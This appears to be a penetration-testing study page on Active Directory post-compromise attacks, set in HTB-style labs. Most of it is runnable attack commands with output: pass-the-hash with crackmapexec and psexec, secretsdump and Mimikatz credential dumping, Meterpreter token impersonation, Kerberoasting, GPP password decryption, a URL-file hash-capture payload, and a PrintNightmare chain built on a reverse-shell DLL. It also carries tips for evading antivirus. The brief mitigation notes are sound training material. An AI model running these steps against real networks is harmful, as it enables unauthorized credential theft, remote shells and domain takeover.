---
description: We have access, now what?
---

# Attacking AD: Post-Compromise Attacks

## Introduction

* <mark style="color:yellow;">All attacks within this section involve having some type of credential first</mark>
* <mark style="color:yellow;">In other words, we need access for these attacks to be effective</mark>

## Pass the Hash/Password

* We need to grab our recently obtained hash/password and throw it around the network and see if anything sticks
* We can do that easily with <mark style="color:yellow;">crackmapexec</mark>

### Pass the Password

* Let's pass what we just cracked

```
crackmapexec 10.10.10.0/24 -u user -d htb -p Password1
```

### Pass the Hash

* We can do that by running metasploit's psexec, crackmapexec, or impacket's psexec

<mark style="color:yellow;">Metasploit: windows/smb/psexec</mark>

Pass the Hash:

```
crackmapexec 10.10.10.0/24 -u user -H <hash_here> --local
```

## Pass the Password Attacks

SMB:

```
crackmapexec smb 192.168.57.0/24 -u user -d htb.local -p Password1
```

* Did you get a pwn3d?&#x20;
* Time to psexec!

Psexec:

```
impacket-psexec domain/user:Password1@<pwn3d_IP>
```

## Dumping Hashes w/ secretsdump

Dumping hashes w/ known valid creds:

```
impacket-secretsdump domain/user:Password1@<pwn3d_IP>
```

* If you have more than 1 pwn3d IP, re run the tool with the other IP(s)!
* Focus on the local SAM hashes

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Grab the hashes and place them into a hashes.txt file to crack them and pass them around the network!!!

## Cracking NTLM Hashes w/ Hashcat

<mark style="color:yellow;">Note: You can pass around NTLMv1 hashes. You CAN'T pass around NTLMv2 hashes.</mark>

<mark style="color:yellow;">NTLMv1 Hashes: 1000</mark>

<mark style="color:yellow;">NTLMv2 Hashes: 5600</mark>

Step 1: Copy the hashes and place them into the Hashcat folder

Step 2: Attempt to crack the hashes

```
hashcat64.exe -m 1000 hashes.txt rockyou.txt -O
```

Blank Passwords:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* If you see something like this, odds are this account is disabled and you cannot do anything with it
* Still worth a shot!

## Pass the Hash Attacks

SMB:

```
crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
```

Get a pwn3d?

Time to get a shell:

```
impacket-psexec "Frank Castle":@192.168.57.141 -hashes LM:NT
```

## Token Impersonation

What are tokens?

* Tokens are <mark style="color:yellow;">temporary keys that allow you access to a system/network</mark> without having to provide credentials each time that you access a file.&#x20;
* This is comparable to <mark style="color:yellow;">cookies</mark> for computers

There are <mark style="color:yellow;">two types</mark> of tokens:

* <mark style="color:yellow;">Delegate</mark> - Created for logging into a machine or using RDP
* <mark style="color:yellow;">Impersonate</mark> - "non-interactive"; such as attaching a network drive or a domain logon script

### Meterpreter Shell

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > load incognito
Loading extensino incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
MARVEL\fcastle
```

* Try to look for a user that has a delegation token available that you have access to

The next thing we are going to do is try to impersonate that user:

```
meterpreter > impersonate_token marvel\\fcastle
Delegation tokens available
Successfully impersonated user MARVEL\fcastle

meterpreter > shell
C:\Windows\system32>whoami
marvel\fcastle
```

* If the user is a Domain Admin and that token is available, we can impersonate it and become them!
* We will use <mark style="color:yellow;">mimikatz</mark> here!

List Tokens:

```
meterpreter > list_tokens -u
Delegation tokens available
MARVEL\Administrator
MARVEL\fcastle
```

Impersonate Token:

```
meterpreter> impersonate_token MARVEL\\administrator
Delegation tokens available
Successfully impersonated user MARVEL\administrator

meterpreter> shell

C:\Windows\system32>whoami
marvel\administrator
```

* We are now administrator!

Now, we can Dump hashes as Domain Admin:

```
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer HYDRA.marvel.local

mimikatz (powershell) # privilege::debug
privilege '20' OK

mimikatz (powershell) # LSADump::LSA /patch
```

* <mark style="color:yellow;">Upon success, this will dump all of the hashes within the domain</mark>
* <mark style="color:yellow;">This of course includes the Kerberos Ticket Granting Ticket Account (krbtgt)</mark>

## Incognito Token Impersonation

<mark style="color:yellow;">Remember, delegate tokens exist upon login and boot. If a user logs in, you can impersonate them until the computer reboots. Then, you will have to wait for them to log back in if so!</mark>

Servers are RARELY restarted.&#x20;

Think of the servers that you get access to, <mark style="color:yellow;">there very well could be a Domain Admin logged in</mark> to that computer! <mark style="color:yellow;">That token is essentially SITTING there</mark> until the computer reboots. This is one way to <mark style="color:yellow;">move laterally</mark> to machine to machine.&#x20;

* <mark style="color:red;">Metasploit</mark> will be utilized

```
msfconsole 

use exploit/windows/smb/psexec

set rhosts tun0

set dmbdomain <domain_here>

set smbpass <smb_pass_here>

set smbuser <user_here>

show targets

set target 2

set payload windows/x64/meterpreter/reverse_tcp

run

meterpreter >
```

* Okay, we have a meterpreter shell, now what?
* Time to configure PowerShell and Incognito

```
meterpreter > hashdump

meterpreter > getuid

meterpreter > sysinfo

meterpreter > load

meterpreter > shell

C:\Windows\system32>powershell -ep bypass

PS C:\Windows\system32> ^C #press ctrl+C
Terminate channel 1? [y/n] y

meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > help
```

Now that we are at this point and we have a token we can impersonate, we can do things such as:

* Adding a user to a global group
* Adding a user to a local group
* Adding a user with all tokens
* Impersonating a token
* Listing tokens
* Snarfing hashes

### Impersonating Token

* We will be utilizing the <mark style="color:yellow;">impersonate\_token Incognito command</mark>

```
meterpreter > list_tokens -u

Delegate Tokens Available
MARVEL\Administrator

meterpreter > impersonate_token marvel\\administrator
Delegation token available
Successfully impersonated user MARVEL\Administrator

meterpreter > shell

C:\Windows\system32>whoami

marvel\administrator
```

### Attempting hashdump but the system is denying access?

<mark style="color:yellow;">rev2self</mark>

```
C:\Windows\system32> ^C
Terminate channel 2? [y/n] y

meterpreter > hashdump
Operation failed: Access is denied.

meterpreter > meterpreter > rev2self

meterpreter > hashdump

===dump will appear here===
```

### Did a new user just log in?

Say theoretically we are another user but fcastle logs in a few minutes ago. We can capture this behavior by listing the tokens on the machine via <mark style="color:yellow;">list\_tokens.</mark>

Once we have captured this user, we can then use <mark style="color:yellow;">impersonate\_token</mark> to impersonate them!

```
meterpreter > list_tokens -u

Delegation Tokens Available
MARVEL\Administrator
MARVEL\fcastle

meterpreter > impersonate_token marvel\\fcastle
Delegation token available
Successfully impersonated user MARVEL\fcastle
```

## Token Impersonation Mitigation

Strategies include:

* Limiting user/group token creation permissions
* Account tiering
* Local admin restriction

### Limiting user/group token creation permissions

Example:

Domain administrators should ONLY be logging into Domain Controllers. This is principal of least privilege (PoLP).

<mark style="color:yellow;">If for some reason that domain administrator logs into a user computer or a server and that user's computer gets compromised, that token can be impersonated!</mark>

This grants us an unbelievably easy win.

### Account Tiering

Always enforce local admin restrictions!

If users are NOT local admins on their computers, we cannot get a shell on that machine with their account. This entirely prevents us from getting onto the computer and utilizing this kind of attack.&#x20;

Example:

Bob has 2 accounts. Bob and Bob Admin.

Bob is for everyday use and only for that.

Bob Admin is used to access the Domain Controller and for that only.

## Kerberoasting

This is an attack against the Kerberos Authentication protocol.

<mark style="color:yellow;">This should always be attempted as soon as you get creds.</mark>

### How it works:

Step 1: This is when you have a valid user (username and password) account which will grant us a Ticket Granting Ticket (TGT).&#x20;

Step 2: With that TGT, you can request a service ticket for a service.

Step 3: That service ticket is going to be encrypted with the server's account hash.

Step 4: Capture the hash from the service ticket and crack the hash!

### Exploitation

<mark style="color:yellow;">Impacket-GetUserSPNs</mark>

* Remember, a valid username and password must be in your possession for this to work

Step 1: Get <mark style="color:yellow;">SPNs</mark> and <mark style="color:yellow;">dump hash</mark>

Example Syntax:

```
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.1 -request
```

Step 2: Copy/paste hash and place into a text file called kerberoast\_hash.txt

Step 3: Crack the hash with Hashcat

```
hashcat -m 13100 kerberoast_hash.txt rockyou.txt
```

## Kerberoasting Mitigations

* There is nothing that you can really do to defend against kerberoasting since it is taking advantage of a Windows feature
* There are two basic strategies that have been proven effective

Strategies:

* Strong passwords
* Enforcement of least privilege

<mark style="color:yellow;">Do NOT ever make your service accounts Domain Administrators or of a high privilege.</mark>

## Group Policy Preferences (GPP Attack)&#x20;

This is also known as <mark style="color:yellow;">MS14-025</mark>

* Admins created policies using embedded credentials
* These credentials were encrypted and placed in "cpassword"
* The key was accidentally leaked by Microsoft
* This was patched in MS14-025, but does not prevent previous uses

This means that we can DECRYPT THIS PASSWORD AT ANYTIME.

## Abusing GPP

* This attack is going to take place on Hack The Box's "Active" box
* From the nmap scan, we are able to quickly identify that this is more than likely a Domain Controller because we see things such as:
  * 53
  * 88
  * LDAP
  * LDAPSSL

### Exploitation

We attempt anonymous login via SMB:

```
smbclient -L \\\\10.10.10.100\\
Enter password:
Anonymous login successful

Sharename
Replication    Disk

smbclient \\\\10.10.10.100\\Replication
Enter password:
Anonymous login successful
smb: \> prompt off
smb: \> recurse on
smb: \> mget *

Groups.xml file
```

* We instantly notice <mark style="color:yellow;">Groups.xml</mark> when targetting GPP
* When opening this file, we can see our <mark style="color:yellow;">cpassword</mark>!
* We also identify the user that this password belongs to in the file!&#x20;
  * svc\_tgs

### gpp-decrypt

Copy the cpassword and open a new tab in terminal:

```
gpp-decrypt <place_cpassword_here>
GPPstillStandingStrong2k18
```

### Privilege Escalation after GPP Attack

Kerberoasting:

```
impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

<krb5tgs_hash_here>
```

* We have a service ticket!!

Time to crack the hash:

* Place the ENTIRE hash into the hashes.txt file

```
hashcat64.exe -m 13100 hashes.txt rockyou.txt -O

Ticketmaster1968@10.10.10.100
```

Authentication:

```
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100

C:\Windows\system32>whoami
nt authority\system
```

## URL File Attacks -- Originally known as SCF Attack

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share" %}

Imagine the following scenario:

* You have compromised a user
* This user has share access
* This means that you have access to capture additional hashes via <mark style="color:yellow;">Responder</mark>
* Or an open file share will work as well

### Payload

```
html
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```

* Change the IP in IconFile to your attacker IP
* When you go to save the file, make sure you are saving it as something like "@test.url"
* The @ will force the file at the top of the share

### Responder

```
sudo responder -I tun0 -v
```

* Upon navigating to the file, dumping the file into a file share, it will dump hashes like crazy!!

## PrintNightmare (CVE-2021-1675)

### Detecting Vulnerability

<mark style="color:yellow;">rpcdump.py</mark>

```
impacket-rpcdump @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'


Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

* If you see the following output, you are indeed <mark style="color:yellow;">VULNERABLE</mark>
* Utilize the RCE exploit found below!

### Exploitation

* We need to create and host a malicious DLL

Create malicious DLL:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=5555 -f dll > shell.dll
```

Start Metasploit:

```
msfconsole

use multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lport 5555

set lhost tun0

run

listening
```

Share File (SMB Server):

```
impacket-smbserver smb . -smb2support

python3 CVE-2021-1675.py marvel.local/fcastle:Password1@192.168.138.132 '\\kali_IP\smb\shell.dll'
```

If you get an error: make sure you are utilizing smb2support!

### Returning back to Meterpreter

* You can obfuscate the DLL if it keeps getting caught by AV
* You will notice that hashes can be dumped upon using hashdump and if you do shell you can gain shell access.
* Be sure to run getuid as well

### Repos

RCE:

{% embed url="https://github.com/cube0x0/CVE-2021-1675" %}

Local Privilege Escalation:

{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}

## Mimikatz Overview

### What is it?

* This is a tool that is used to view and steal credentials, generate Kerberos tickets, and leverage attacks
* <mark style="color:yellow;">Dumps credentials stored in memory</mark>
* Performs attacks such as Credential Dumping, Pass-The-Hash, Over-Pass-The-Hash, Pass-the-Ticket, Golden Ticket, and Silver Ticket!

### Repo

Original:

{% embed url="https://github.com/gentilkiwi/mimikatz" %}

* This is a .ps1 version
* This can be paired with <mark style="color:yellow;">IEX</mark> to run the binary over the network without it actually touching the system's disk
* <mark style="color:yellow;">Therefore bypassing Anti-Virus</mark>

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" %}

## Mimikatz Capabilities

We need to be able to bypass memory protections such as lsass.exe. This can be done with privilege::debug.

LSA is Local Security Authority

### Wiki

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki" %}

### Credential Dumping

```
mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK
```

### Dumping logon passwords

This is for all logged on users:

```
mimikatz # sekurlsa::logonpasswords
```

* You can get an NTLM hash
* If it is NTLMv1 you can pass it!

### Dumping SAM

```
mimikatz # lsadump::sam

mimikatz # lsadump::sam /patch

mimikatz # lsadump::lsa /patch
```

<mark style="color:yellow;">Other ways of dumping the sam:</mark>

* If this does not work, you can download the SAM to Kali and dump it
* You can use impacket-secretsdump
* Get a shell with metasploit and do hashdump

## Golden Ticket Attacks

* <mark style="color:yellow;">Have access to the krbtgt hash?</mark>
* This is the Kerberos Ticket Granting Ticket account
* This allows us to generate tickets!
